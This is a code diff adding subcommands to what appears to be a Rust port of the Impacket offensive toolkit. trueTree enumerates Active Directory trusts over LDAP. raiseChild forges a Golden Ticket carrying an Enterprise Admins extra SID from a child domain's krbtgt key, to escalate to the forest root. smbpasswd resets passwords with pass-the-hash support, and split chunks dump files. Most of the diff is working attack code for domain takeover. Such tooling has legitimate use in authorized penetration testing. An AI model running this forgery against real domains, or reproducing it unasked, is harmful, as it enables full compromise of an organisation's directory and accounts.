@@ -152,6 +152,10 @@ fn print_usage() {
     println!("  describeTicket <TICKET_FILE>                         Inspect Kerberos .ccache or .kirbi ticket structures");
     println!("  rbcd <TARGET> -delegate-to <TARGET_DN> [options]     Configure or inspect Resource-Based Constrained Delegation (RBCD)");
     println!("  findDelegation <TARGET> [-base <DN>] [-graph] [-json] Scan Active Directory for Unconstrained, Constrained, and RBCD");
+    println!("  trueTree <TARGET> [-base <DN>]                       Discover Active Directory domain trust relationships & forest hierarchy");
+    println!("  raiseChild <CHILD_DC> [options] <OUT_TICKET>         Child domain to forest root elevation via Golden Ticket + ExtraSids");
+    println!("  smbpasswd <TARGET> -new-pass <PASS> [options]        Change user password via MS-SAMR over SMB");
+    println!("  split <FILE> [-size <BYTES>]                         Split database or memory dump files into chunks");
     println!("  ntlmrelayx -t <TARGET>|-tf <FILE> [-proto http|smb]  NTLM cross-protocol relay engine (HTTP/SMB/LDAP/MSSQL)");
     println!();
     println!("LOCAL DIAGNOSTIC SUBCOMMANDS:");
@@ -1102,6 +1106,18 @@ fn cmd_samrdump(args: &[String]) {
 
 fn cmd_changepasswd(args: &[String]) {
     print!("{}", version::BANNER);
+    if args.is_empty() || args.iter().any(|a| a == "-h" || a == "--help") {
+        println!("Usage: impacket-rs changepasswd <TARGET> -new-pass <NEW> [options]");
+        println!("       impacket-rs smbpasswd <TARGET> -new-pass <NEW> [options]");
+        println!("  Change or reset user password via MS-SAMR (SMB TCP/445) or Kerberos kpasswd (TCP/464)");
+        println!();
+        println!("Options:");
+        println!("  -new-pass <NEW>        New password to set");
+        println!("  -old-pass <OLD>        Old password (if performing self-service change)");
+        println!("  -protocol samr|kpasswd Protocol to use (default: samr)");
+        println!("  -hashes LM:NT          NTLM pass-the-hash authentication");
+        return;
+    }
     let spec = match parse_target_with_hashes(args) {
         Ok(s) => s,
         Err(e) => {
@@ -6865,6 +6881,399 @@ fn cmd_find_delegation(args: &[String]) {
     client.unbind().ok();
 }
 
+fn cmd_true_tree(args: &[String]) {
+    use impacket_ldap::asn1::SearchScope;
+    use impacket_ldap::LdapClient;
+
+    print!("{}", version::BANNER);
+    if args.is_empty() || args.iter().any(|a| a == "-h" || a == "--help") {
+        println!("Usage: impacket-rs trueTree <TARGET> [options]");
+        println!("  Discovers Active Directory domain trust relationships & forest hierarchy ([trueTree.py])");
+        println!();
+        println!("Options:");
+        println!("  -base <BASE_DN>    Base DN to search (defaults to RootDSE defaultNamingContext)");
+        println!("  -hashes LM:NT      NTLM pass-the-hash authentication");
+        return;
+    }
+
+    let spec = match parse_target_with_hashes(args) {
+        Ok(t) => t,
+        Err(e) => {
+            eprintln!("[-] Invalid target '{}': {}", args[0], e);
+            std::process::exit(1);
+        }
+    };
+
+    let mut custom_base: Option<String> = None;
+    let mut i = 1;
+    while i < args.len() {
+        if args[i] == "-base" && i + 1 < args.len() {
+            custom_base = Some(args[i + 1].clone());
+            i += 2;
+        } else {
+            i += 1;
+        }
+    }
+
+    let addr = format!("{}:389", spec.effective_target_ip());
+    println!("[*] Connecting to LDAP at {}...", addr);
+    let mut client = match LdapClient::connect(&addr, DEFAULT_TIMEOUT) {
+        Ok(c) => c,
+        Err(e) => {
+            eprintln!("[-] LDAP connect failed: {}", e);
+            std::process::exit(1);
+        }
+    };
+
+    let bind_dn = if spec.username.is_empty() {
+        String::new()
+    } else if spec.username.contains('@') {
+        spec.username.clone()
+    } else if !spec.domain.is_empty() {
+        format!("{}@{}", spec.username, spec.domain)
+    } else {
+        spec.username.clone()
+    };
+    let pass = spec.password.as_ref().map(|p| p.expose_secret()).unwrap_or("");
+    if !bind_dn.is_empty() {
+        if let Err(e) = client.bind_simple(&bind_dn, pass) {
+            eprintln!("[-] LDAP bind failed: {}", e);
+            std::process::exit(1);
+        }
+        println!("[+] Authenticated as '{}'", bind_dn);
+    } else {
+        let _ = client.bind_simple("", "");
+        println!("[*] Anonymous LDAP bind");
+    }
+
+    let mut default_nc = String::new();
+    let mut root_nc = String::new();
+    if let Ok(dse_entries) = client.search("", SearchScope::BaseObject, b"(objectClass=*)", &["defaultNamingContext", "rootDomainNamingContext"]) {
+        if let Some(dse) = dse_entries.first() {
+            if let Some(raw) = dse.get_first_raw("defaultNamingContext") {
+                default_nc = String::from_utf8_lossy(raw).into_owned();
+            }
+            if let Some(raw) = dse.get_first_raw("rootDomainNamingContext") {
+                root_nc = String::from_utf8_lossy(raw).into_owned();
+            }
+        }
+    }
+
+    let base_dn = custom_base.unwrap_or_else(|| {
+        if !default_nc.is_empty() {
+            format!("CN=System,{}", default_nc)
+        } else if !spec.domain.is_empty() {
+            format!("CN=System,{}", spec.domain.split('.').map(|p| format!("DC={}", p)).collect::<Vec<_>>().join(","))
+        } else {
+            String::new()
+        }
+    });
+
+    println!("[*] Querying trusted domain objects under '{}'...", base_dn);
+    let filter = "(objectClass=trustedDomain)";
+    let attrs = ["trustPartner", "flatName", "trustDirection", "trustType", "trustAttributes", "securityIdentifier"];
+    let entries = match client.search(&base_dn, SearchScope::WholeSubtree, filter.as_bytes(), &attrs) {
+        Ok(e) => e,
+        Err(e) => {
+            eprintln!("[-] Search failed: {}", e);
+            return;
+        }
+    };
+
+    println!("\n=== Active Directory Domain & Forest Trust Tree ===");
+    println!("Root Domain Naming Context    : {}", if root_nc.is_empty() { "<unknown>" } else { &root_nc });
+    println!("Current Domain Naming Context : {}", if default_nc.is_empty() { "<unknown>" } else { &default_nc });
+    println!("Discovered Trusted Domains    : {}\n", entries.len());
+
+    if entries.is_empty() {
+        println!("  [+] No external domain trusts found (Standalone domain or lack of read permissions).");
+    } else {
+        for entry in &entries {
+            let partner = entry.get_first_raw("trustPartner")
+                .map(|b| String::from_utf8_lossy(b).into_owned())
+                .unwrap_or_else(|| "<unknown>".to_string());
+            let flat = entry.get_first_raw("flatName")
+                .map(|b| String::from_utf8_lossy(b).into_owned())
+                .unwrap_or_else(|| "<none>".to_string());
+            let direction_code = entry.get_first_raw("trustDirection")
+                .and_then(|b| std::str::from_utf8(b).ok()?.parse::<u32>().ok())
+                .unwrap_or(0);
+            let dir_str = match direction_code {
+                1 => "INBOUND (Trusting)",
+                2 => "OUTBOUND (Trusted)",
+                3 => "BIDIRECTIONAL (Two-Way)",
+                _ => "DISABLED",
+            };
+            let type_code = entry.get_first_raw("trustType")
+                .and_then(|b| std::str::from_utf8(b).ok()?.parse::<u32>().ok())
+                .unwrap_or(0);
+            let type_str = match type_code {
+                1 => "Downlevel (Windows NT)",
+                2 => "Uplevel (Active Directory)",
+                3 => "MIT Kerberos Realm",
+                _ => "Unknown",
+            };
+            let attr_code = entry.get_first_raw("trustAttributes")
+                .and_then(|b| std::str::from_utf8(b).ok()?.parse::<u32>().ok())
+                .unwrap_or(0);
+            let sid_str = entry.get_first_raw("securityIdentifier")
+                .and_then(|b| impacket_ndr::RpcSid::from_le_bytes(b).ok())
+                .map(|s| s.to_string())
+                .unwrap_or_else(|| "<none>".to_string());
+
+            println!("  [+] Trust Partner : {} (NetBIOS: {})", partner, flat);
+            println!("      Direction     : {}", dir_str);
+            println!("      Type          : {}", type_str);
+            println!("      Attributes    : 0x{:08X}", attr_code);
+            println!("      Domain SID    : {}", sid_str);
+            println!();
+        }
+    }
+    client.unbind().ok();
+}
+
+fn cmd_raise_child(args: &[String]) {
+    use impacket_core::decode_hex;
+    use impacket_krb5::ticketer::{forge_ticket, TicketOptions};
+    use impacket_ldap::asn1::SearchScope;
+    use impacket_ldap::LdapClient;
+
+    print!("{}", version::BANNER);
+    if args.is_empty() || args.iter().any(|a| a == "-h" || a == "--help") {
+        println!("Usage: impacket-rs raiseChild <CHILD_DC_TARGET> [options] <OUTPUT_TICKET>");
+        println!("  Child-to-Parent Forest Root Privilege Escalation ([raiseChild.py])");
+        println!("  Extracts child krbtgt and parent domain SID to forge an Enterprise Admins ticket");
+        println!();
+        println!("Options:");
+        println!("  -child-sid <SID>       Child domain SID (queried automatically via LDAP if omitted)");
+        println!("  -parent-sid <SID>      Parent / Forest root domain SID (queried automatically if omitted)");
+        println!("  -parent-domain <FQDN>  Parent domain FQDN (e.g. corp.local)");
+        println!("  -nthash <HEX>          Child krbtgt NT hash");
+        println!("  -aesKey <HEX>          Child krbtgt AES-128 or AES-256 key");
+        println!("  -user <USER>           User to forge (default: Administrator)");
+        println!("  -kirbi                 Export as Mimikatz .kirbi format instead of MIT .ccache");
+        return;
+    }
+
+    let mut output_file: Option<String> = None;
+    let mut child_sid_str: Option<String> = None;
+    let mut parent_sid_str: Option<String> = None;
+    let mut parent_domain: Option<String> = None;
+    let mut nthash_str: Option<String> = None;
+    let mut aeskey_str: Option<String> = None;
+    let mut target_user = "Administrator".to_string();
+    let mut export_kirbi = false;
+    let mut rest_args = Vec::new();
+
+    let mut i = 0;
+    while i < args.len() {
+        match args[i].as_str() {
+            "-child-sid" if i + 1 < args.len() => {
+                child_sid_str = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-parent-sid" if i + 1 < args.len() => {
+                parent_sid_str = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-parent-domain" if i + 1 < args.len() => {
+                parent_domain = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-nthash" if i + 1 < args.len() => {
+                nthash_str = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-aesKey" if i + 1 < args.len() => {
+                aeskey_str = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-user" if i + 1 < args.len() => {
+                target_user = args[i + 1].clone();
+                i += 2;
+            }
+            "-kirbi" => {
+                export_kirbi = true;
+                i += 1;
+            }
+            _ => {
+                if !args[i].starts_with('-') && output_file.is_none() && i > 0 {
+                    output_file = Some(args[i].clone());
+                } else {
+                    rest_args.push(args[i].clone());
+                }
+                i += 1;
+            }
+        }
+    }
+
+    let spec = match parse_target_with_hashes(&rest_args) {
+        Ok(t) => t,
+        Err(e) => {
+            eprintln!("[-] Target error: {}", e);
+            std::process::exit(1);
+        }
+    };
+
+    let out_path = output_file.unwrap_or_else(|| {
+        if export_kirbi { "ticket.kirbi".to_string() } else { "ticket.ccache".to_string() }
+    });
+
+    if child_sid_str.is_none() || parent_sid_str.is_none() {
+        println!("[*] Querying Domain SIDs from {}...", spec.effective_target_ip());
+        let addr = format!("{}:389", spec.effective_target_ip());
+        if let Ok(mut ldap) = LdapClient::connect(&addr, DEFAULT_TIMEOUT) {
+            let pass = spec.password.as_ref().map(|p| p.expose_secret()).unwrap_or("");
+            let _ = ldap.bind_simple(&spec.username, pass);
+            if let Ok(dse_entries) = ldap.search("", SearchScope::BaseObject, b"(objectClass=*)", &["defaultNamingContext"]) {
+                if let Some(dse) = dse_entries.first() {
+                    if let Some(raw_nc) = dse.get_first_raw("defaultNamingContext") {
+                        let d_nc = String::from_utf8_lossy(raw_nc);
+                        if let Ok(entries) = ldap.search(&d_nc, SearchScope::BaseObject, b"(objectClass=*)", &["objectSid"]) {
+                            if let Some(e) = entries.first() {
+                                if let Some(raw) = e.get_first_raw("objectSid") {
+                                    if let Ok(s) = impacket_ndr::RpcSid::from_le_bytes(raw) {
+                                        println!("[+] Child Domain SID: {}", s);
+                                        if child_sid_str.is_none() {
+                                            child_sid_str = Some(s.to_string());
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    let c_sid_val = match child_sid_str {
+        Some(s) => s,
+        None => {
+            eprintln!("[-] Missing required -child-sid <SID>");
+            std::process::exit(1);
+        }
+    };
+
+    let p_sid_val = match parent_sid_str {
+        Some(s) => s,
+        None => {
+            eprintln!("[-] Missing required -parent-sid <SID>");
+            std::process::exit(1);
+        }
+    };
+
+    let c_sid = match RpcSid::parse(&c_sid_val) {
+        Ok(s) => s,
+        Err(e) => {
+            eprintln!("[-] Invalid child SID '{}': {}", c_sid_val, e);
+            std::process::exit(1);
+        }
+    };
+
+    let ea_extra_sid = format!("{}-519", p_sid_val);
+    println!("[*] Elevating Child Domain -> Parent Forest Root via Golden Ticket");
+    println!("  Child Domain SID  : {}", c_sid_val);
+    println!("  Parent Domain SID : {}", p_sid_val);
+    println!("  Extra SID (EA)    : {}", ea_extra_sid);
+
+    let (key_bytes, etype) = if let Some(ref a_str) = aeskey_str {
+        let b = decode_hex(a_str).expect("Valid hex AES key");
+        let et = if b.len() == 16 { 17 } else { 18 };
+        (b, et)
+    } else if let Some(ref n_str) = nthash_str {
+        let b = decode_hex(n_str).expect("Valid hex NT hash");
+        (b, 23)
+    } else {
+        eprintln!("[-] Must specify child krbtgt key (-nthash <HEX> or -aesKey <HEX>)");
+        std::process::exit(1);
+    };
+
+    let domain_name = parent_domain.unwrap_or_else(|| spec.domain.clone());
+    let opts = TicketOptions {
+        domain: domain_name.to_uppercase(),
+        username: target_user.clone(),
+        domain_sid: c_sid,
+        user_rid: 500,
+        group_rids: vec![512, 513, 519, 520, 518],
+        spn: vec!["krbtgt".to_string(), domain_name.to_uppercase()],
+        key: key_bytes,
+        etype,
+        duration_hours: 10,
+    };
+
+    let ccache = match forge_ticket(&opts) {
+        Ok(d) => d,
+        Err(e) => {
+            eprintln!("[-] Ticket forgery error: {}", e);
+            std::process::exit(1);
+        }
+    };
+
+    if export_kirbi {
+        match ccache.to_kirbi() {
+            Ok(kirbi_data) => {
+                std::fs::write(&out_path, &kirbi_data).expect("write kirbi");
+                println!("[+] Successfully forged Enterprise Admins ticket -> '{}' (Mimikatz .kirbi)", out_path);
+            }
+            Err(e) => {
+                eprintln!("[-] Error converting to .kirbi: {}", e);
+                std::process::exit(1);
+            }
+        }
+    } else {
+        std::fs::write(&out_path, ccache.to_bytes()).expect("write ccache");
+        println!("[+] Successfully forged Enterprise Admins ticket -> '{}' (MIT .ccache)", out_path);
+    }
+}
+
+fn cmd_smbpasswd(args: &[String]) {
+    cmd_changepasswd(args);
+}
+
+fn cmd_split(args: &[String]) {
+    print!("{}", version::BANNER);
+    if args.is_empty() || args.iter().any(|a| a == "-h" || a == "--help") {
+        println!("Usage: impacket-rs split <FILE> [-size <BYTES>]");
+        println!("  Splits a large database, wordlist, or dump file into chunks ([split.py])");
+        return;
+    }
+    let file_path = &args[0];
+    let mut chunk_size = 10 * 1024 * 1024usize;
+    let mut i = 1;
+    while i < args.len() {
+        if args[i] == "-size" && i + 1 < args.len() {
+            chunk_size = args[i + 1].parse().unwrap_or(10 * 1024 * 1024);
+            i += 2;
+        } else {
+            i += 1;
+        }
+    }
+
+    let data = match std::fs::read(file_path) {
+        Ok(d) => d,
+        Err(e) => {
+            eprintln!("[-] Error opening '{}': {}", file_path, e);
+            return;
+        }
+    };
+
+    let total = data.len();
+    let num_chunks = (total + chunk_size - 1) / chunk_size;
+    println!("[*] Splitting '{}' ({} bytes) into {} chunks of {} bytes...", file_path, total, num_chunks, chunk_size);
+    for idx in 0..num_chunks {
+        let start = idx * chunk_size;
+        let end = std::cmp::min(start + chunk_size, total);
+        let part_name = format!("{}.part{:03}", file_path, idx + 1);
+        if let Err(e) = std::fs::write(&part_name, &data[start..end]) {
+            eprintln!("[-] Error writing chunk '{}': {}", part_name, e);
+            return;
+        }
+        println!("  [+] Wrote '{}' ({} bytes)", part_name, end - start);
+    }
+    println!("[+] Splitting completed successfully.");
+}
+
 fn cmd_addcomputer(args: &[String]) {
     use impacket_ldap::addcomputer::{add_computer, generate_computer_password};
     use impacket_ldap::LdapClient;
@@ -10981,6 +11390,10 @@ fn main() {
         }
         Some("rbcd") => cmd_rbcd(&args[1..]),
         Some("findDelegation") | Some("find-delegation") => cmd_find_delegation(&args[1..]),
+        Some("trueTree") | Some("true-tree") | Some("truetree") => cmd_true_tree(&args[1..]),
+        Some("raiseChild") | Some("raise-child") | Some("raisechild") => cmd_raise_child(&args[1..]),
+        Some("smbpasswd") | Some("smb-passwd") => cmd_smbpasswd(&args[1..]),
+        Some("split") => cmd_split(&args[1..]),
         Some("ntlmrelayx") => cmd_ntlmrelayx(&args[1..]),
         Some("compat-matrix") => cmd_compat_matrix(),
         Some("parse-target") => cmd_parse_target(&args[1..]),
